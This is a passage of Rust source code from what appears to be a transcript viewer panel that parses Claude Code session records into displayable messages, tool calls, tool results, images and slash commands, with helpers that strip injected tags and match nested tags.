                    if let Some(kind) = cache.get(first_cache_key.as_ref()) {
                        entries.push(Entry {
                            key: key.clone(),
                            kind,
                        });
                        for part_index in 1.. {
                            let part_key = SharedString::from(format!("{key}#part-{part_index}"));
                            let part_cache_key = cache_key(record, &part_key);
                            let Some(kind) = cache.get(part_cache_key.as_ref()) else {
                                break;
                            };
                            entries.push(Entry {
                                key: part_key,
                                kind,
                            });
                        }
                    } else {
                        let kinds = tool_result_kinds(record, block, tool_names, home_directory);
                        for (part_index, kind) in kinds.into_iter().enumerate() {
                            let part_key = if part_index == 0 {
                                key.clone()
                            } else {
                                SharedString::from(format!("{key}#part-{part_index}"))
                            };
                            let part_cache_key = cache_key(record, &part_key);
                            let kind = cache.kind(part_cache_key.as_ref(), || kind);
                            entries.push(Entry {
                                key: part_key,
                                kind,
                            });
                        }
                    }
                    continue;
                }
                let cache_key = cache_key(record, &key);
                // The key carries the block's index within the record, so a block that
                // is left out does not shift the keys of the ones after it.
                if let Some(kind) = cache.optional_kind(cache_key.as_ref(), || {
                    block_kind(record, block, tool_names, home_directory)
                }) {
                    entries.push(Entry { key, kind });
                }
            }
        }
        _ => {
            let cache_key = cache_key(record, &base_key);
            let kind = cache.kind(cache_key.as_ref(), || {
                unknown_kind(&record.record_type, record.subtype.as_deref(), &record.raw)
            });
            entries.push(Entry {
                key: base_key,
                kind,
            });
        }
    }
}

/// The key one of a record's entries is cached under, or `None` for a record that must
/// not be cached at all: a record without a uuid is keyed by its position in the
/// conversation, and positions shift as the conversation grows, so the same key would
/// name a different record after a rebuild.
fn cache_key(record: &TranscriptRecord, key: &SharedString) -> Option<SharedString> {
    record.uuid.is_some().then(|| key.clone())
}

/// Remembers which tool a `tool_use` block called, so that the `tool_result` answering it
/// can be labelled with the tool's name.
fn register_tool_name(block: &Value, tool_names: &mut HashMap<String, SharedString>) {
    if block.get("type").and_then(Value::as_str) != Some("tool_use") {
        return;
    }
    if let Some(id) = block.get("id").and_then(Value::as_str) {
        let name = SharedString::from(
            block
                .get("name")
                .and_then(Value::as_str)
                .unwrap_or("Tool")
                .to_string(),
        );
        tool_names.insert(id.to_string(), name);
    }
}

/// Message text is never treated as a persisted-output placeholder: it is written by the
/// user or the model, so a marker in it is forged or coincidental, and honouring it would
/// hand the panel an arbitrary path to read. Claude Code writes the placeholder into the
/// `tool_result` block, which [`block_kind`] handles.
///
/// `None` for a user record whose text is nothing but injected context, which has no
/// message in it to show; see [`user_visible_text`].
fn message_kind(record: &TranscriptRecord, text: &str) -> Option<EntryKind> {
    if origin_kind(record) == Some(TASK_NOTIFICATION_ORIGIN) {
        return None;
    }

    let role = message_role(record);

    // Drawn as the command it was rather than as prose the user wrote: see
    // [`rewrite_slash_commands`].
    if role == MessageRole::User {
        if let Some(command) = rewrite_slash_commands(text) {
            return Some(EntryKind::SlashCommand {
                text: SharedString::from(command),
            });
        }
    }

    let source = match &role {
        MessageRole::Peer { .. } => peer_message_body(text),
        MessageRole::User => {
            let visible = user_visible_text(text)?;
            if origin_kind(record) == Some(CHANNEL_ORIGIN) {
                channel_message_body(&visible)
            } else {
                visible
            }
        }
        _ => text.to_string(),
    };

    Some(EntryKind::Message {
        role,
        source: SharedString::from(source),
        usage: Usage::from_record(&record.raw),
        answered_at: answered_at(&record.raw),
    })
}

fn message_role(record: &TranscriptRecord) -> MessageRole {
    if record.is_compact_summary {
        return MessageRole::CompactSummary;
    }

    match origin_kind(record) {
        Some(HUMAN_ORIGIN) | Some(CHANNEL_ORIGIN) => return MessageRole::User,
        Some(PEER_ORIGIN) => {
            return MessageRole::Peer {
                from: peer_from(record),
            };
        }
        Some(_) => {}
        None => {}
    }

    if prompt_source(record) == Some(SYSTEM_PROMPT_SOURCE) {
        return MessageRole::System;
    }

    if origin_kind(record).is_some() || prompt_source(record).is_some() {
        // A promptSource other than system, with no origin.kind we name, is still
        // classified from the fields rather than from `type`.
        if prompt_source(record) == Some("typed") || prompt_source(record) == Some("queued") {
            return MessageRole::User;
        }
    }

    // Records written before the origin fields existed carry the hand-back in the text
    // alone, and one of them bundles a task notification with it. Drawn from `type` they
    // would be the reader's own words.
    if record.record_type == USER_RECORD_TYPE
        && let Some(text) = record_message_text(record)
        && let Some(from) = peer_handback_from(text)
    {
        return MessageRole::Peer { from };
    }

    MessageRole::from_record_type(&record.record_type)
}

fn origin_kind(record: &TranscriptRecord) -> Option<&str> {
    record
        .raw
        .get("origin")
        .and_then(|origin| origin.get("kind"))
        .and_then(Value::as_str)
}

fn origin_from_field(record: &TranscriptRecord) -> Option<&str> {
    record
        .raw
        .get("origin")
        .and_then(|origin| origin.get("from"))
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|from| !from.is_empty())
}

fn prompt_source(record: &TranscriptRecord) -> Option<&str> {
    record.raw.get("promptSource").and_then(Value::as_str)
}

fn peer_from(record: &TranscriptRecord) -> Option<SharedString> {
    if let Some(from) = origin_from_field(record) {
        return Some(SharedString::from(from.to_string()));
    }
    let text = record
        .raw
        .get("message")
        .and_then(|message| message.get("content"))
        .and_then(Value::as_str)?;
    agent_message_from(text).map(SharedString::from)
}

fn agent_message_from(text: &str) -> Option<String> {
    let start = text.find("<agent-message")?;
    let tag_end_offset = text.get(start..)?.find('>')?;
    let opening = text.get(start..start.saturating_add(tag_end_offset))?;
    let marker = "from=\"";
    let from_start = opening.find(marker)? + marker.len();
    let rest = opening.get(from_start..)?;
    let from_end = rest.find('"')?;
    let from = rest.get(..from_end)?.trim();
    (!from.is_empty()).then(|| from.to_string())
}

/// Inner text of the outermost `<channel>` wrapper, or `None` when the text is not
/// wrapped. The last `</channel>` is the close so a message that quotes one is not cut
/// short.
fn channel_inner_text(text: &str) -> Option<&str> {
    let open = format!("<{CHANNEL_WRAPPER}");
    let start = text.find(&open)?;
    let tag_end_offset = text.get(start..)?.find('>')?;
    let inner_start = start.saturating_add(tag_end_offset).saturating_add(1);
    let close = format!("</{CHANNEL_WRAPPER}>");
    let inner_end = text.rfind(&close)?;
    if inner_end < inner_start {
        return None;
    }
    text.get(inner_start..inner_end)
}

fn channel_message_body(text: &str) -> String {
    match channel_inner_text(text) {
        Some(inner) => inner.trim().to_string(),
        None => text.to_string(),
    }
}

/// The same unwrapping for a line read from the queue log rather than from a record.
///
/// A record says it came over the channel; the queue log says nothing about where its
/// lines came from, so the envelope is only taken off text that is nothing but an
/// envelope. A message in which the reader merely quotes the tags is their own words and
/// is left whole.
fn queued_message_body(text: &str) -> String {
    let trimmed = text.trim();
    let is_envelope = trimmed
        .strip_prefix(&format!("<{CHANNEL_WRAPPER}"))
        .is_some_and(|rest| rest.starts_with(['>', ' ', '\t', '\r', '\n']))
        && trimmed.ends_with(&format!("</{CHANNEL_WRAPPER}>"));
    match is_envelope {
        true => channel_message_body(trimmed),
        false => text.to_string(),
    }
}

/// The sender of a hand-back a record carries in its text alone, or `None` for a record
/// that is not one.
///
/// Only the shape Claude Code writes counts: the lead line, or the wrapper itself,
/// standing at the start of what is left once the injected blocks are cut. A message in
/// which the reader merely quotes either of them is still the reader's own.
fn peer_handback_from(text: &str) -> Option<Option<SharedString>> {
    let visible = user_visible_text(text)?;
    let body = visible.trim();
    let body = body
        .strip_prefix(PEER_MESSAGE_LEAD)
        .map(str::trim_start)
        .unwrap_or(body);
    if !body.starts_with(&format!("<{AGENT_MESSAGE_WRAPPER}")) {
        return None;
    }
    Some(agent_message_from(body).map(SharedString::from))
}

fn peer_message_body(text: &str) -> String {
    let mut body = text.trim();
    if let Some(rest) = body.strip_prefix(PEER_MESSAGE_LEAD) {
        body = rest.trim();
    }
    if let Some(inner) = tag_contents(body, AGENT_MESSAGE_WRAPPER) {
        return inner.trim().to_string();
    }
    body.to_string()
}

fn record_message_text(record: &TranscriptRecord) -> Option<&str> {
    record
        .raw
        .get("message")
        .and_then(|message| message.get("content"))
        .and_then(Value::as_str)
        .or_else(|| record.raw.get("content").and_then(Value::as_str))
}

fn task_notification_context_text(record: &TranscriptRecord) -> Option<String> {
    let text = record_message_text(record)?;
    let stripped = user_visible_text(text).unwrap_or_default();
    let stripped = stripped.trim();
    if stripped.is_empty() {
        return None;
    }
    Some(stripped.to_string())
}

fn is_toolbar_attachment(record: &TranscriptRecord) -> bool {
    matches!(
        record
            .raw
            .get("attachment")
            .and_then(|attachment| attachment.get("type"))
            .and_then(Value::as_str),
        Some(TOTAL_TOKENS_REMINDER_ATTACHMENT) | Some(AUTO_MODE_ATTACHMENT)
    )
}

fn turn_footer_kind(record: &TranscriptRecord) -> EntryKind {
    let number = |key: &str| {
        record
            .raw
            .get(key)
            .and_then(|value| {
                value.as_u64().or_else(|| {
                    // Claude Code writes these from JavaScript numbers, which JSON may
                    // carry as `272000.0`. A negative one is not a count of anything.
                    value
                        .as_f64()
                        .filter(|number| number.is_finite() && *number >= 0.0)
                        .map(|number| number as u64)
                })
            })
            .unwrap_or(0)
    };
    EntryKind::TurnFooter {
        duration_ms: number("durationMs"),
        message_count: number("messageCount"),
        pending_background_agents: number("pendingBackgroundAgentCount"),
    }
}

fn system_note_kind(record: &TranscriptRecord) -> EntryKind {
    match record.raw.get("content").and_then(Value::as_str) {
        Some(text) => EntryKind::SystemNote {
            subtype: SharedString::from(record.subtype.clone().unwrap_or_default()),
            text: SharedString::from(text.to_string()),
            url: if record.subtype.as_deref() == Some(BRIDGE_STATUS_SUBTYPE) {
                record
                    .raw
                    .get("url")
                    .and_then(Value::as_str)
                    .and_then(bridge_url)
            } else {
                None
            },
        },
        None => unknown_kind(&record.record_type, record.subtype.as_deref(), &record.raw),
    }
}

/// `None` only for a user text block that is nothing but injected context; see
/// [`message_kind`].
/// The `bridge_status` URL as a link, or `None` for a string that is not one.
fn bridge_url(url: &str) -> Option<SharedString> {
    let url = url.trim();
    let is_the_bridge = url.starts_with(BRIDGE_URL_PREFIX)
        && !url
            .chars()
            .any(|character| character.is_whitespace() || character.is_control());
    is_the_bridge.then(|| SharedString::from(url.to_string()))
}

fn block_kind(
    record: &TranscriptRecord,
    block: &Value,
    tool_names: &HashMap<String, SharedString>,
    home_directory: Option<&Path>,
) -> Option<EntryKind> {
    let kind = match block.get("type").and_then(Value::as_str) {
        Some("text") => {
            let text = block
                .get("text")
                .and_then(Value::as_str)
                .unwrap_or_default();
            return message_kind(record, text);
        }

        Some("thinking") => {
            let text = block
                .get("thinking")
                .and_then(Value::as_str)
                .or_else(|| block.get("text").and_then(Value::as_str))
                .unwrap_or_default();
            EntryKind::Thinking {
                source: SharedString::from(text.to_string()),
            }
        }

        Some("tool_use") => {
            let name = SharedString::from(
                block
                    .get("name")
                    .and_then(Value::as_str)
                    .unwrap_or("Tool")
                    .to_string(),
            );
            let input = block.get("input").map(json_text).unwrap_or_default();
            let diff = (name.as_ref() == EDIT_TOOL_NAME)
                .then(|| block.get("input").and_then(edit_input_diff))
                .flatten()
                .map(SharedString::from);
            EntryKind::ToolUse {
                name,
                input: SharedString::from(input),
                id: block
                    .get("id")
                    .and_then(Value::as_str)
                    .map(|id| SharedString::from(id.to_string())),
                diff,
            }
        }

        Some("tool_result") => {
            return tool_result_kinds(record, block, tool_names, home_directory)
                .into_iter()
                .next();
        }

        Some("image") => image_kind(block),

        other => unknown_kind(
            other.unwrap_or("block"),
            None,
            &without_base64_payload(block),
        ),
    };

    Some(kind)
}

/// Whether the record's `toolUseResult` can be read as the answer to the `tool_result`
/// block being drawn.
///
/// The field sits on the record while the blocks sit inside it, so it names one answer
/// however many the record carries: a record answering two calls at once would show the
/// first call's output — and, with a `persistedOutputPath` beside it, the first call's
/// file — under the second call's name. A record with two of them has each block's own
/// `content` to fall back on, which is the answer to that block and nothing else.
fn record_holds_one_tool_result(record: &TranscriptRecord) -> bool {
    record
        .raw
        .get("message")
        .and_then(|message| message.get("content"))
        .and_then(Value::as_array)
        .is_some_and(|blocks| {
            blocks
                .iter()
                .filter(|block| {
                    block.get("type").and_then(Value::as_str) == Some(TOOL_RESULT_BLOCK_TYPE)
                })
                .count()
                == 1
        })
}

/// The files a `SendUserFile` result delivered, or `None` for any other result.
///
/// Keyed off the `attachments` array rather than off the tool's name, because the name is
/// what the caller typed and the array is what the delivery recorded.
fn sent_files_kind(
    result: &Value,
    is_error: bool,
    result_text: Option<SharedString>,
) -> Option<EntryKind> {
    let files: Vec<SentFile> = result
        .get("attachments")?
        .as_array()?
        .iter()
        .filter_map(sent_file)
        .collect();
    if files.is_empty() {
        return None;
    }

    let caption = result
        .get("caption")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|caption| !caption.is_empty())
        .map(|caption| SharedString::from(caption.to_string()));

    Some(EntryKind::SentFiles {
        caption,
        files,
        is_error,
        result_text: is_error.then_some(result_text).flatten(),
    })
}

fn tool_result_kinds(
    record: &TranscriptRecord,
    block: &Value,
    tool_names: &HashMap<String, SharedString>,
    home_directory: Option<&Path>,
) -> Vec<EntryKind> {
    let tool_use_id = block
        .get("tool_use_id")
        .and_then(Value::as_str)
        .map(|id| SharedString::from(id.to_string()));
    let label = tool_use_id
        .as_ref()
        .and_then(|id| tool_names.get(id.as_ref()).cloned())
        .unwrap_or_else(|| SharedString::from("Tool result"));
    let is_error = block
        .get("is_error")
        .and_then(Value::as_bool)
        .unwrap_or(false);
    let structured_result = record
        .raw
        .get("toolUseResult")
        .filter(|_| record_holds_one_tool_result(record));
    let result_text = structured_result
        .and_then(tool_use_result_text)
        .or_else(|| {
            let rendered = block_content_text(block.get("content"));
            (!rendered.is_empty()).then_some(rendered)
        });
    if let Some(kind) = structured_result.and_then(|result| {
        sent_files_kind(
            result,
            is_error,
            result_text.as_deref().map(SharedString::from),
        )
    }) {
        return vec![kind];
    }

    let mut kinds = Vec::new();
    if let Some(Value::Array(items)) = block.get("content") {
        let mut text_parts: Vec<String> = Vec::new();
        for item in items {
            match item.get("type").and_then(Value::as_str) {
                Some("image") => {
                    flush_tool_result_text(
                        &mut kinds,
                        &mut text_parts,
                        &label,
                        is_error,
                        tool_use_id.as_ref(),
                        structured_result,
                        home_directory,
                    );
                    kinds.push(image_kind(item));
                }
                Some("text") => {
                    if let Some(text) = item.get("text").and_then(Value::as_str) {
                        text_parts.push(text.to_string());
                    }
                }
                _ => {
                    text_parts.push(json_text(&without_base64_payload(item)));
                }
            }
        }
        if kinds.is_empty() && text_parts.is_empty() {
            // Fall through to structured / JSON below.
        } else {
            flush_tool_result_text(
                &mut kinds,
                &mut text_parts,
                &label,
                is_error,
                tool_use_id.as_ref(),
                structured_result,
                home_directory,
            );
            if !kinds.is_empty() {
                return kinds;
            }
        }
    }

    let mut text = result_text
        .or_else(|| structured_result.map(json_text))
        .unwrap_or_default();
    if label.as_ref() == WRITE_TOOL_NAME {
        let note = write_result_note(structured_result);
        if text.is_empty() {
            text = note;
        } else {
            text = format!("{note}\n\n{text}");
        }
    }
    if let Some(diff) = structured_patch_text(structured_result) {
        text = if text.is_empty() {
            diff
        } else {
            format!("{diff}\n\n{text}")
        };
    }
    let body = match structured_persisted_output(structured_result, &text, home_directory)
        .or_else(|| parse_persisted_output(&text))
    {
        Some(persisted) => ToolResultBody::Persisted(persisted),
        None => ToolResultBody::Inline(SharedString::from(text)),
    };
    vec![EntryKind::ToolResult {
        label,
        is_error,
        body,
        tool_use_id,
    }]
}

fn flush_tool_result_text(
    kinds: &mut Vec<EntryKind>,
    text_parts: &mut Vec<String>,
    label: &SharedString,
    is_error: bool,
    tool_use_id: Option<&SharedString>,
    structured_result: Option<&Value>,
    home_directory: Option<&Path>,
) {
    if text_parts.is_empty() {
        return;
    }
    let text = text_parts.join("\n");
    text_parts.clear();
    let body = match structured_persisted_output(structured_result, &text, home_directory)
        .or_else(|| parse_persisted_output(&text))
    {
        Some(persisted) => ToolResultBody::Persisted(persisted),
        None => ToolResultBody::Inline(SharedString::from(text)),
    };
    kinds.push(EntryKind::ToolResult {
        label: label.clone(),
        is_error,
        body,
        tool_use_id: tool_use_id.cloned(),
    });
}

fn write_result_note(result: Option<&Value>) -> String {
    match result
        .and_then(|result| result.get("originalFile"))
        .and_then(Value::as_str)
    {
        Some(original) => format!("overwrote {} lines", original.lines().count()),
        None => "new file".to_string(),
    }
}

fn structured_patch_text(result: Option<&Value>) -> Option<String> {
    let patches = result?.get("structuredPatch")?.as_array()?;
    let mut lines = Vec::new();
    for patch in patches {
        let Some(hunk_lines) = patch.get("lines").and_then(Value::as_array) else {
            continue;
        };
        let old_start = patch.get("oldStart").and_then(Value::as_u64).unwrap_or(0);
        let new_start = patch.get("newStart").and_then(Value::as_u64).unwrap_or(0);
        lines.push(format!("@@ -{old_start},+{new_start} @@"));
        for line in hunk_lines {
            if let Some(text) = line.as_str() {
                lines.push(text.to_string());
            }
        }
    }
    (!lines.is_empty()).then_some(lines.join("\n"))
}

/// The format a sent image will be decoded as, or `None` for a file this panel cannot
/// draw. The media type the delivery recorded is preferred; the extension answers for the
/// deliveries that recorded none.
fn sent_image_format(file: &SentFile) -> Option<ImageFormat> {
    if let Some(format) = file
        .media_type
        .as_ref()
        .and_then(|media_type| ImageFormat::from_mime_type(media_type))
    {
        return Some(format);
    }

    let extension = file.path.extension()?.to_str()?.to_ascii_lowercase();
    ImageFormat::from_mime_type(&format!("image/{extension}"))
}

fn sent_file(attachment: &Value) -> Option<SentFile> {
    let path = PathBuf::from(attachment.get("path").and_then(Value::as_str)?);
    let name = match path.file_name() {
        Some(name) => name.to_string_lossy().into_owned(),
        None => path.to_string_lossy().into_owned(),
    };
    let media_type = attachment
        .get("media_type")
        .and_then(Value::as_str)
        .map(|media_type| SharedString::from(media_type.to_string()));
    // Both are consulted: `isImage` is absent from some deliveries, and a media type of
    // `image/*` says the same thing.
    let is_image = attachment
        .get("isImage")
        .and_then(Value::as_bool)
        .unwrap_or(false)
        || media_type
            .as_ref()
            .is_some_and(|media_type| media_type.starts_with("image/"));

    Some(SentFile {
        path,
        name: SharedString::from(name),
        size: attachment.get("size").and_then(Value::as_u64),
        media_type,
        is_image,
    })
}

fn image_kind(block: &Value) -> EntryKind {
    let source = block.get("source");
    let media_type = source
        .and_then(|source| source.get("media_type"))
        .and_then(Value::as_str)
        .unwrap_or_default();
    let data = source
        .and_then(|source| source.get("data"))
        .and_then(Value::as_str)
        .unwrap_or_default();

    match (ImageFormat::from_mime_type(media_type), decode_base64(data)) {
        (Some(format), Some(bytes)) if !bytes.is_empty() => EntryKind::Image {
            image: Arc::new(Image::from_bytes(format, bytes)),
            media_type: SharedString::from(media_type.to_string()),
        },
        _ => unknown_kind("image", None, &without_base64_payload(block)),
    }
}

fn unknown_kind(record_type: &str, subtype: Option<&str>, value: &Value) -> EntryKind {
    let label = match subtype {
        Some(subtype) => format!("{record_type} / {subtype}"),
        None => record_type.to_string(),
    };
    EntryKind::Unknown {
        label: SharedString::from(label),
        raw: SharedString::from(json_text(value)),
    }
}

/// The text of a message that was queued behind a running turn, or `None` for every
/// other attachment.
fn queued_command_prompt(record: &TranscriptRecord) -> Option<SharedString> {
    let attachment = record.raw.get("attachment")?;
    if attachment.get("type").and_then(Value::as_str)? != QUEUED_COMMAND_ATTACHMENT {
        return None;
    }

    // A message with an image in it is recorded as content blocks rather than as a
    // string, and the blocks carry the image's base64 beside the text.
    let prompt = match attachment.get("prompt")? {
        Value::String(prompt) => prompt.trim().to_string(),
        Value::Array(blocks) => blocks
            .iter()
            .filter_map(|block| block.get("text").and_then(Value::as_str))
            .collect::<Vec<_>>()
            .join("\n")
            .trim()
            .to_string(),
        _ => return None,
    };

    // Same rule as the conversation's own records: a queued `<task-notification>` is the
    // CLI telling itself a background command finished, not a message anyone typed.
    let visible = user_visible_text(&prompt)?;
    let source = match attachment
        .get("origin")
        .and_then(|origin| origin.get("kind"))
        .and_then(Value::as_str)
    {
        Some(CHANNEL_ORIGIN) => channel_message_body(&visible),
        _ => visible,
    };
    Some(SharedString::from(source))
}

/// The images pasted into a message that was queued behind a running turn.
///
/// They are only here. The user record the CLI writes when the turn finishes carries no
/// content at all, so an image dropped from the attachment is one the reader never sees
/// again — however plainly it is still on their terminal.
fn queued_command_images(record: &TranscriptRecord) -> Vec<&Value> {
    let Some(attachment) = record.raw.get("attachment") else {
        return Vec::new();
    };
    if attachment.get("type").and_then(Value::as_str) != Some(QUEUED_COMMAND_ATTACHMENT) {
        return Vec::new();
    }

    let Some(Value::Array(blocks)) = attachment.get("prompt") else {
        return Vec::new();
    };
    blocks
        .iter()
        .filter(|block| block.get("type").and_then(Value::as_str) == Some(IMAGE_BLOCK_TYPE))
        .collect()
}

fn attachment_item(
    record: &TranscriptRecord,
    key: SharedString,
    home_directory: Option<&Path>,
) -> AttachmentItem {
    let attachment = record.raw.get("attachment");
    let label = SharedString::from(
        attachment
            .and_then(|attachment| attachment.get("type"))
            .and_then(Value::as_str)
            .unwrap_or("attachment")
            .to_string(),
    );

    let rendered: Vec<&str> = record
        .raw
        .get("rendered")
        .and_then(Value::as_array)
        .map(|items| {
            items
                .iter()
                .filter_map(|item| item.get("content").and_then(Value::as_str))
                .collect()
        })
        .unwrap_or_default();

    let rendered_text = (!rendered.is_empty()).then(|| rendered.join("\n\n"));
    let attachment_content = attachment
        .and_then(|attachment| attachment.get("content"))
        .and_then(Value::as_str);

    // An attachment's own marker text is one of the two places a persisted-output path
    // may be read from, and the one hook output arrives by. It is read from the
    // attachment's text rather than from `body`, because most of these records carry no
    // `rendered` array and `body` is then pretty-printed JSON, in which the marker's
    // newlines are escaped and the path would come out as one run of escaped text.
    let persisted = rendered_text
        .as_deref()
        .and_then(parse_persisted_output)
        .or_else(|| attachment_content.and_then(parse_persisted_output))
        .filter(|persisted| persisted_output_is_loadable(&persisted.path, home_directory));

    let body = rendered_text.unwrap_or_else(|| json_text(attachment.unwrap_or(&record.raw)));

    AttachmentItem {
        key,
        label,
        body: SharedString::from(body),
        persisted,
    }
}

/// The text of a structured `toolUseResult`, or `None` for a shape this has no rule for.
/// `None` rather than the raw JSON, because a shape such as a `Read` result holds the
/// file in a JSON string whose newlines are escaped: one unreadable line. The rendering
/// beside it in the content block is the readable form of the same result.
fn tool_use_result_text(value: &Value) -> Option<String> {
    if let Some(text) = value.as_str() {
        return Some(text.to_string());
    }

    let object = value.as_object()?;
    let stdout = object.get("stdout").and_then(Value::as_str);
    let stderr = object
        .get("stderr")
        .and_then(Value::as_str)
        .filter(|stderr| !stderr.is_empty());

    if stdout.is_some() || stderr.is_some() {
        let mut text = stdout.unwrap_or_default().to_string();
        if let Some(stderr) = stderr {
            if !text.is_empty() {
                text.push('\n');
            }
            text.push_str(stderr);
        }
        return Some(text);
    }

    if let Some(content) = object.get("content").and_then(Value::as_str) {
        return Some(content.to_string());
    }

    None
}

fn block_content_text(content: Option<&Value>) -> String {
    match content {
        None => String::new(),
        Some(Value::String(text)) => text.clone(),
        Some(Value::Array(items)) => items
            .iter()
            .map(|item| match item.get("text").and_then(Value::as_str) {
                Some(text) => text.to_string(),
                None => json_text(item),
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Some(other) => json_text(other),
    }
}

/// The raw JSON of a block, with any base64 payload replaced by a description of it.
/// Without this an image block that failed to decode would dump megabytes of base64 into
/// the fallback view, while the substitution still records that the data was there.
fn without_base64_payload(block: &Value) -> Value {
    let mut block = block.clone();
    if let Some(data) = block
        .get_mut("source")
        .and_then(|source| source.get_mut("data"))
    {
        if let Some(encoded) = data.as_str() {
            let length = encoded.len();
            *data = Value::String(format!("<{length} base64 characters>"));
        }
    }
    block
}

/// The one line the session list is reduced to when it is collapsed: how many sessions
/// are running, and which of them is being read.
fn collapsed_sessions_summary(session_count: usize, selected_name: Option<&str>) -> SharedString {
    let sessions = if session_count == 1 {
        "1 session".to_string()
    } else {
        format!("{session_count} sessions")
    };

    SharedString::from(match selected_name {
        Some(name) => format!("{sessions} · {name}"),
        None => sessions,
    })
}

/// The name a session is shown under: the transcript's `ai-title` when one has been
/// written, otherwise the registry name, otherwise the session id.
fn preferred_session_name(session: &RegisteredSession, ai_title: Option<&str>) -> String {
    preferred_name(
        ai_title,
        session.name.as_deref(),
        session.session_id.as_str(),
    )
}

fn preferred_name(ai_title: Option<&str>, registry_name: Option<&str>, session_id: &str) -> String {
    if let Some(title) = ai_title.map(str::trim).filter(|title| !title.is_empty()) {
        return title.to_string();
    }
    registry_name
        .map(str::trim)
        .filter(|name| !name.is_empty())
        .unwrap_or(session_id)
        .to_string()
}

/// What is left of a user record's text once the blocks Claude Code injected into it are
/// removed, or `None` when nothing but those blocks was there.
///
/// This is a display rule and nothing more: the record keeps its place in the transcript's
/// tree and its offset in the file, and only the text drawn for it is trimmed.
fn user_visible_text(text: &str) -> Option<String> {
    // A slash command is rewritten rather than filtered: the blocks it is recorded as
    // hold the command the user ran and the words they typed after it, so cutting them
    // out the way the injected wrappers are cut would drop the message itself.
    if let Some(command) = rewrite_slash_commands(text) {
        return Some(command);
    }

    let mut visible = String::with_capacity(text.len());
    let mut rest = text;

    while let Some(block) = next_injected_block(rest) {
        visible.push_str(rest.get(..block.start)?);
        rest = match block.end {
            Some(end) => rest.get(end..)?,
            // With no closing tag there is no telling where the block was meant to end,
            // and assuming it runs to the end of the text would throw away everything
            // after it — including the rest of a message that is still being written.
            None => {
                visible.push_str(rest.get(block.start..block.open_end)?);
                rest.get(block.open_end..)?
            }
        };
    }
    visible.push_str(rest);

    let visible = visible.trim();
    (!visible.is_empty()).then(|| visible.to_string())
}

/// The line the user typed, rebuilt from the blocks a slash command is recorded as, or
/// `None` for a record that is not one.
///
/// Claude Code does not write `/goal ship the panel` as text. It writes the command into
/// a [`COMMAND_NAME_WRAPPER`] block and the words after it into a
/// [`COMMAND_ARGS_WRAPPER`] block, with a `command-message` block of its own in between.
/// The arguments are the only part of that the user typed, and they are often the whole
/// point of the message, so the record is rebuilt into the line rather than being hidden
/// or drawn as a wall of tags.
fn rewrite_slash_commands(text: &str) -> Option<String> {
    let name = tag_contents(text, COMMAND_NAME_WRAPPER)?.trim();
    if name.is_empty() {
        return None;
    }

    let arguments = match find_opening_tag(text, COMMAND_ARGS_WRAPPER, 0) {
        // The arguments were opened and the closing tag has not been written yet, which
        // is what a record read while it is being written looks like. Where the
        // arguments were meant to end is not knowable, and guessing at it would eat the
        // rest of the record, so nothing is rewritten at all.
        Some(_) => tag_contents(text, COMMAND_ARGS_WRAPPER)?.trim(),
        // A command that takes no arguments is sometimes recorded without the block, and
        // the command is then all there is to show.
        None => "",
    };

    Some(match arguments.is_empty() {
        true => name.to_string(),
        false => format!("{name} {arguments}"),
    })
}

/// What sits between `name`'s opening and closing tags, or `None` when the text holds no
/// closing tag for it.
///
/// The contents are returned verbatim: they are words the user typed, so a `<` in them
/// opens nothing and is not looked at.
fn tag_contents<'text>(text: &'text str, name: &str) -> Option<&'text str> {
    let (_, open_end) = find_opening_tag(text, name, 0)?;
    let end = find_closing_tag(text, name, open_end)?;
    // `find_closing_tag` reports the byte after the `>` of `</name>`.
    text.get(open_end..end.checked_sub(name.len() + "</>".len())?)
}

/// Where one injected block sits in the text it was found in.
#[derive(Clone, Copy)]
struct InjectedBlock {
    /// The byte the opening tag starts at.
    start: usize,
    /// The byte after the opening tag's `>`.
    open_end: usize,
    /// The byte after the matching closing tag, or `None` when the text holds no closing
    /// tag for this block.
    end: Option<usize>,
}

/// The first injected block in `text`, whichever wrapper it belongs to.
fn next_injected_block(text: &str) -> Option<InjectedBlock> {
    let mut first: Option<(&str, usize, usize)> = None;
    for name in INJECTED_WRAPPERS {
        let Some((start, open_end)) = find_opening_tag(text, name, 0) else {
            continue;
        };
        if first.is_none_or(|(_, first_start, _)| start < first_start) {
            first = Some((name, start, open_end));
        }
    }

    let (name, start, open_end) = first?;
    Some(InjectedBlock {
        start,
        open_end,
        end: find_closing_tag(text, name, open_end),
    })
}

/// The opening tag of `name` at or after `from`, as the byte it starts at and the byte
/// after its `>`.
///
/// The tag may carry attributes — `<codegraph_context note="…">` — so the name is only
/// recognized where the character after it cannot continue a longer name, and the tag
/// then runs to the first `>`. An opening tag whose `>` was never written ends at the end
/// of the text, which is what keeps a truncated record from being scanned past its end.
fn find_opening_tag(text: &str, name: &str, from: usize) -> Option<(usize, usize)> {
    let opening = format!("<{name}");
    let mut searched = from;

    loop {
        let start = searched + text.get(searched..)?.find(&opening)?;
        let after_name = start + opening.len();
        match text.get(after_name..).and_then(|rest| rest.chars().next()) {
            None => return Some((start, text.len())),
            Some('>') => return Some((start, after_name + 1)),
            Some(character) if character.is_whitespace() || character == '/' => {
                let end = match text.get(after_name..).and_then(|rest| rest.find('>')) {
                    Some(offset) => after_name + offset + 1,
                    None => text.len(),
                };
                return Some((start, end));
            }
            // A longer name that merely starts with this one, such as
            // `<system-reminders>`; the search carries on past it.
            Some(_) => searched = after_name,
        }
    }
}

/// The byte after the closing tag that matches an opening tag ending at `open_end`, or
/// `None` when there is none.
///
/// A wrapper can hold another of its own kind, so the closing tags are counted against
/// the opening ones rather than the first closing tag being taken as the match.
fn find_closing_tag(text: &str, name: &str, open_end: usize) -> Option<usize> {
    let closing = format!("</{name}>");
    let mut depth = 1usize;
    let mut searched = open_end;

    while depth > 0 {
        let next_closing = searched + text.get(searched..)?.find(&closing)?;
        let next_opening = find_opening_tag(text, name, searched).map(|(start, _)| start);

        match next_opening {
            Some(opening_start) if opening_start < next_closing => {
                depth += 1;
                // Past the opening tag rather than past its `>`, which is enough to make
                // progress and cannot land inside the tag's name.
                searched = opening_start + 1 + name.len();
            }
            _ => {
                depth -= 1;
                searched = next_closing + closing.len();
            }
        }
    }

    Some(searched)
}

fn json_text(value: &Value) -> String {
    serde_json::to_string_pretty(value).unwrap_or_else(|_| value.to_string())
}

fn first_line(text: &str) -> SharedString {
    let line = text.lines().find(|line| !line.trim().is_empty());
